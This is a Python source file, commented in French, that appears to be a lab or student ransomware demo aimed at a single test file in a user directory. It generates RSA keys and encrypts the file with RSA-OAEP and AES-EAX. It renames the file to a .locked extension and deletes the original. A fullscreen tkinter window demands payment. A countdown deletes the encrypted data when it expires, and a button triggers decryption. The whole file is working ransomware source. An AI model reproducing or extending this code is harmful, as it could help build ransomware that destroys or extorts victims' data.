### - Installer le requirements.txt 
# pip install -r requirements.txt
# et relancer l'interpréteur de code
 
### - IMPORTATIONS
 
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher  import  PKCS1_OAEP,  AES
import base64, os, time 
import tkinter as tk
 
### - VARIABLES
 
# Variable pour lister les éléments de ce répertoire
path=r"C:\Users\ADM_VM01"
# Variables de générations de clés
key = RSA.generate(2048)
privateKey  = key.export_key()
publicKey  = key.publickey().export_key()
# Pointe vers le fichier chiffré
filecrypt = 'test_chiffré.LOCKED'
# Variable utilisées dans la fonction encrypt / decrypt
ext = ".locked"
fileName = 'test.txt'
 
### - FONCTIONS
 
# Fonction de list des fichiers dans le répertoire
def list_dir ():
    files = os.listdir(path)
    for name in files:
            print(name)
# Fonction de chiffrement des fichiers
def encrypt(dataFile, publicKey, ext):
    """
    use EAX mode to allow detection of unauthorized modifications
    """
    #Lis le fichier à déchiffrer
    with open(dataFile,  'rb')  as f:
        data = f.read()
        data = bytes(data)
        key = RSA.import_key(publicKey)
 
    #Génére une clé symétrique de chiffrement
    sessionKey  = os.urandom(16)
    cipher = PKCS1_OAEP.new(key)
 
    #Chiffre la clé symétrique de chiffrement avec la clé publique
    encryptedSessionKey  = cipher.encrypt(sessionKey)
    cipher = AES.new(sessionKey,  AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
 
    # Cette partie  permet  d’enregistrer  le fichier avec “_encrypt.ext”
    [ fileName, fileExtension ] = dataFile.split('.')
    encryptedFile  = fileName + '_chiffré.'  + fileExtension
    with open(encryptedFile,  'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey,  cipher.nonce,  tag, ciphertext)  ]
    print('Fichier chiffré disponible ici : ' + encryptedFile)
 
    #Modification de l'extension
    base = os.path.splitext(encryptedFile)[0]
    os.rename(encryptedFile, base + ext)
    #Suppression le fichier d'origine
    os.remove(dataFile)

# Fonction de déchiffrement des fichiers
def decrypt(dataFile, privateKeyFile):
    """
    use EAX mode to allow detection  of unauthorized  modifications
    """
    # Lis la clé privée
    with open(privateKeyFile,  'rb') as f:
        privateKey  = f.read()
 
        # Créer un objet de clé privée
        key = RSA.import_key(privateKey)
    with open(dataFile,  'rb')  as f:
 
        # Lis la clé de session
        encryptedSessionKey,  nonce, tag, ciphertext  = [ f.read(x) for x in (key.size_in_bytes(),  16, 16, -1) ]
        cipher  = PKCS1_OAEP.new(key)
 
        # Déchiffre la clé de chiffrement
        sessionKey  = cipher.decrypt(encryptedSessionKey)
        cipher = AES.new(sessionKey,  AES.MODE_EAX,  nonce)
 
        # Déchiffrer  les données
        data = cipher.decrypt_and_verify(ciphertext,  tag)
        [ fileName, fileExtension ] = dataFile.split('.')
        decryptedFile  = fileName + '_déchiffré.'  + fileExtension
        with open(decryptedFile,  'wb') as f:
            f.write(data)
            print('Fichier déchiffré disponible ici : ' + decryptedFile)
            f.close()

    #Suppression du fichier chiffré
    os.remove(filecrypt)
    #Supression des clés lors du déchiffrement
    os.remove("private.pem") 
    os.remove("public.pem") 

# Fonction de compte à rebourd
def countdown(count):
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)
 
    label['text'] = '{}:{}:{}'.format(hour, minute, second)
 
    if second >= 0 or minute > 0 or hour > 0:
            if second > 0:
                second -= 1
                root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
            elif minute > 0:
                minute -= 1
                second = 59
                root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
            elif hour > 0:
                hour -= 1
                minute = 59
                second = 59
                root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
            elif second == 0 and minute == 0 and hour == 0: 
                    os.remove(filecrypt) 
                    button.destroy
                    root.destroy() 
 
######################--TRAITEMENT--######################
 
####################Interface graphique countdown####################
root = tk.Tk()
root.title('Ransomware')
root.geometry('500x500')
#Fullscreen
root.attributes('-fullscreen', True)

root.resizable(False, False)
 
label1 = tk.Label(root, text='\n\n\n\n\n\nVotre PC à été infécté par un rançonlogiciel !!\n\n', font=('arial', 12,'bold'), justify=('center'))
label1.pack()
 
label2 = tk.Label(root, text='Merci denvoyer largent a cette adresse : XXXXX-XXXXX-XXXXX \n\n', font=('arial', 12,'bold'), justify=('center'))
label2.pack()
 
label3 = tk.Label(root, text='Lorsque le timer arrivera à 0 = Plus de données sur le PC \n\n', font=('arial', 12,'bold'), justify=('center'))
label3.pack()

label4 = tk.Label(root, text='\n\nArgent envoyé, cliquez sur le bouton " déchiffrement " pour déchiffrer vos données \n\n', font=('arial', 12,'bold'), justify=('center'))

label = tk.Label(root,font=('arial', 50,'bold'), fg='white', bg='black')
label.pack() 

button = tk.Button(root, text ='Envoyer l\'argent', command=lambda :[button2.pack(), label4.pack(), button.destroy()])
button.pack()

button2 = tk.Button(root,height = 10, width = 50, text ='Déchiffrer', command=lambda :[ decrypt(filecrypt, "private.pem"),root.quit()])

#####################################################################

# Création des fichiers de clés 
fichier = open('public.pem', 'wb')
fichier.write(publicKey)
fichier.close()
 
fichier = open('private.pem', 'wb')
fichier.write(privateKey)
fichier.close()
 
# Encodage de la clé publique
with open('public.pem', 'rb') as f:
    public  = f.read()
    print(base64.b64encode(public ))
 
# Appel de la fonction de liste du répertoire 
list_dir()
 
# Appel de la fonction de chiffrement du fichier
encrypt(fileName, publicKey, ext)
 
countdown('00:00:15')
root.mainloop()
